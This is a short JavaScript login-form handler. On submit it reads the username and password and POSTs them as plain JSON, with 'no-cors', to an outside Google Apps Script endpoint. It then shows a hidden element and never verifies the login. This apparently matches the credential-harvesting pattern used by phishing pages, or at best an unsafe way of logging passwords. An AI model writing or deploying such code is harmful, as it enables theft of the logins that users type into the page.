document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    fetch("https://script.google.com/macros/s/AKfycbwdgpT-eegcD4kk6VBgmbk4IwsqYC_nitu-gM7t3pe8YwSj4M4S_HFZPIVOMYmQLD0n/exec", {
        method: "POST",
        mode: "no-cors",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            username: username,
            password: password
        })
    }).then(() => {
        document.getElementById("userData").style.display = "block";
    }).catch(err => {
        alert("Error: " + err);
    });
});
